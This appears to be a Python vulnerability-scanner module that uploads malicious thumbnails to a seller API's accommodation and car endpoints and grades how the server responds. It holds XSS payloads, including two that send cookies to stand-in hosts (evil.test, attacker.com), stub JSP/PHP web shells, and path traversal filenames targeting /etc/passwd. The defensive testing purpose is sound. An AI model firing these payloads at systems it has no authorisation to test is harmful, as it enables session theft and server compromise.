"""Seller accommodation / car thumbnail upload probes — ported from ARGUS_Modular 4-2 / 4-4."""

from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path
from typing import Any

import httpx

_MODULE_DIR = Path(__file__).resolve().parent


def _judge():
    name = "diag_g21_upload_judge"
    if name not in sys.modules:
        spec = importlib.util.spec_from_file_location(name, _MODULE_DIR / "upload_judge.py")
        if spec is None or spec.loader is None:
            raise ImportError("upload_judge")
        mod = importlib.util.module_from_spec(spec)
        sys.modules[name] = mod
        spec.loader.exec_module(mod)
    return sys.modules[name]


def _accommodation_params(ctx: Any) -> dict[str, Any]:
    return {
        "name": "Upload Security Test",
        "description": "Security Test",
        "category": "HOTEL",
        "location": "Seoul",
        "businessLicense": "123-45-67890",
        "sellerId": ctx.seller_id,
    }


def _svg_case(ctx: Any, svg_content: str, attack_desc: str):
    judge = _judge()
    endpoint = "/api/v1/seller/accommodations"
    url = f"{ctx.base_url}{endpoint}"
    params = {**_accommodation_params(ctx), "name": f"SVG Test — {attack_desc[:24]}"}
    files = {"thumbnail": ("thumb.svg", svg_content.encode("utf-8"), "image/svg+xml")}
    try:
        response = ctx.client.post(url, params=params, files=files, headers=ctx.headers)
        return judge.judge_upload_response(
            suite="accommodation",
            method="POST",
            endpoint=endpoint,
            filename="thumb.svg",
            attack_desc=attack_desc,
            response=response,
        )
    except httpx.HTTPError as exc:
        return judge.judge_upload_response(
            suite="accommodation",
            method="POST",
            endpoint=endpoint,
            filename="thumb.svg",
            attack_desc=attack_desc,
            response=None,
            error=str(exc),
        )


def run_accommodation_probes(ctx: Any) -> list:
    judge = _judge()
    results: list = []

    results.append(
        _svg_case(
            ctx,
            '<svg xmlns="http://www.w3.org/2000/svg">\n  <script>alert(document.cookie)</script>\n</svg>',
            "SVG <script> XSS",
        )
    )
    results.append(
        _svg_case(
            ctx,
            '<svg xmlns="http://www.w3.org/2000/svg">\n  <image href="x" onerror="fetch(\'https://evil.test/?c=\'+document.cookie)"/>\n</svg>',
            "SVG onerror 외부 요청",
        )
    )

    endpoint = "/api/v1/seller/accommodations"
    url = f"{ctx.base_url}{endpoint}"
    params = _accommodation_params(ctx)
    script_cases = [
        (
            "exploit.html",
            b'<html><body><script>document.location="http://attacker.com/?c="+document.cookie</script></body></html>',
            "image/jpeg",
            "HTML 위장 업로드",
        ),
        (
            "shell.jsp",
            b'<%@ page import="java.io.*" %><% out.println("UPLOAD_TEST"); %>',
            "image/jpeg",
            "JSP 웹셸",
        ),
        (
            "shell.jspx",
            b'<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.1">'
            b'<jsp:scriptlet>out.println("UPLOAD_TEST");</jsp:scriptlet></jsp:root>',
            "image/jpeg",
            "JSPX 웹셸",
        ),
    ]
    for filename, content, content_type, desc in script_cases:
        files = {"thumbnail": (filename, content, content_type)}
        try:
            response = ctx.client.post(url, params=params, files=files, headers=ctx.headers)
            results.append(
                judge.judge_upload_response(
                    suite="accommodation",
                    method="POST",
                    endpoint=endpoint,
                    filename=filename,
                    attack_desc=desc,
                    response=response,
                )
            )
        except httpx.HTTPError as exc:
            results.append(
                judge.judge_upload_response(
                    suite="accommodation",
                    method="POST",
                    endpoint=endpoint,
                    filename=filename,
                    attack_desc=desc,
                    response=None,
                    error=str(exc),
                )
            )

    results.extend(_path_traversal_probes(ctx))
    return results


def _path_traversal_probes(ctx: Any) -> list:
    judge = _judge()
    UploadCaseResult = judge.UploadCaseResult
    endpoint = "/api/v1/seller/accommodations"
    url = f"{ctx.base_url}{endpoint}"
    params = {**_accommodation_params(ctx), "name": "Path Traversal Test"}
    marker = b"PATH_TRAVERSAL_TEST_MARKER"
    cases = [
        ("../../../etc/passwd", "원본 ../ 시퀀스"),
        ("..%2F..%2F..%2Fetc%2Fpasswd", "URL 인코딩 ../"),
        ("....//....//....//etc/passwd", "중첩 ../ (....//)"),
    ]
    results: list = []
    for traversal_filename, desc in cases:
        files = {"thumbnail": (traversal_filename, marker, "image/jpeg")}
        try:
            response = ctx.client.post(url, params=params, files=files, headers=ctx.headers)
            code = response.status_code
            if code in (400, 403, 415):
                results.append(
                    UploadCaseResult(
                        suite="accommodation_traversal",
                        method="POST",
                        endpoint=endpoint,
                        filename=traversal_filename,
                        attack_desc=desc,
                        status_code=code,
                        verdict="safe",
                        detail="경로 조작 파일명 차단",
                    )
                )
                continue
            if code not in (200, 201):
                results.append(
                    UploadCaseResult(
                        suite="accommodation_traversal",
                        method="POST",
                        endpoint=endpoint,
                        filename=traversal_filename,
                        attack_desc=desc,
                        status_code=code,
                        verdict="review",
                        detail=f"예상치 못한 코드 {code}",
                    )
                )
                continue
            try:
                res_data = response.json()
            except json.JSONDecodeError:
                results.append(
                    UploadCaseResult(
                        suite="accommodation_traversal",
                        method="POST",
                        endpoint=endpoint,
                        filename=traversal_filename,
                        attack_desc=desc,
                        status_code=code,
                        verdict="review",
                        detail="JSON 응답 분석 불가",
                    )
                )
                continue
            data = res_data.get("data") or {}
            thumb_url = data.get("thumbnailUrl") if isinstance(data, dict) else None
            if not thumb_url:
                results.append(
                    UploadCaseResult(
                        suite="accommodation_traversal",
                        method="POST",
                        endpoint=endpoint,
                        filename=traversal_filename,
                        attack_desc=desc,
                        status_code=code,
                        verdict="review",
                        detail="업로드 성공했으나 URL 없음",
                    )
                )
                continue
            url_lower = str(thumb_url).lower()
            if any(x in url_lower for x in ("..", "%2e%2e", "..%2f")):
                verdict = "vulnerable"
                detail = "반환 URL에 경로 조작 패턴 잔존"
            else:
                verdict = "review"
                detail = "URL은 정상 디렉터리 형태 — 디스크 직접 확인 필요"
            results.append(
                UploadCaseResult(
                    suite="accommodation_traversal",
                    method="POST",
                    endpoint=endpoint,
                    filename=traversal_filename,
                    attack_desc=desc,
                    status_code=code,
                    verdict=verdict,
                    stored_url=str(thumb_url),
                    detail=detail,
                    evidence={"thumbnail_url": thumb_url},
                )
            )
        except httpx.HTTPError as exc:
            results.append(
                UploadCaseResult(
                    suite="accommodation_traversal",
                    method="POST",
                    endpoint=endpoint,
                    filename=traversal_filename,
                    attack_desc=desc,
                    status_code=0,
                    verdict="error",
                    detail=str(exc),
                )
            )
    return results


def run_car_probes(ctx: Any) -> list:
    judge = _judge()
    endpoint = "/api/v1/seller/cars"
    url = f"{ctx.base_url}{endpoint}"
    params = {
        "brand": "TestBrand",
        "model": "TestModel",
        "year": 2024,
        "pricePerDay": 50000,
        "sellerId": ctx.seller_id,
        "description": "Security test car",
        "location": "Seoul",
    }
    attack_cases = [
        ("shell.php", b"<?php echo 'CAR_UPLOAD_TEST'; ?>", "image/jpeg", "PHP 확장자 변조"),
        ("shell.php.jpg", b"<?php echo 'CAR_UPLOAD_TEST'; ?>", "image/jpeg", "이중 확장자 (.php.jpg)"),
        ("photo.jpg", b"<?php echo 'CAR_UPLOAD_TEST'; ?>", "application/x-php", "Content-Type 변조"),
        (
            "thumb.svg",
            b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>',
            "image/svg+xml",
            "SVG XSS",
        ),
    ]
    results: list = []
    for filename, content, content_type, desc in attack_cases:
        files = {"thumbnail": (filename, content, content_type)}
        try:
            response = ctx.client.post(url, params=params, files=files, headers=ctx.headers)
            results.append(
                judge.judge_upload_response(
                    suite="rental_car",
                    method="POST",
                    endpoint=endpoint,
                    filename=filename,
                    attack_desc=desc,
                    response=response,
                )
            )
        except httpx.HTTPError as exc:
            results.append(
                judge.judge_upload_response(
                    suite="rental_car",
                    method="POST",
                    endpoint=endpoint,
                    filename=filename,
                    attack_desc=desc,
                    response=None,
                    error=str(exc),
                )
            )
    return results
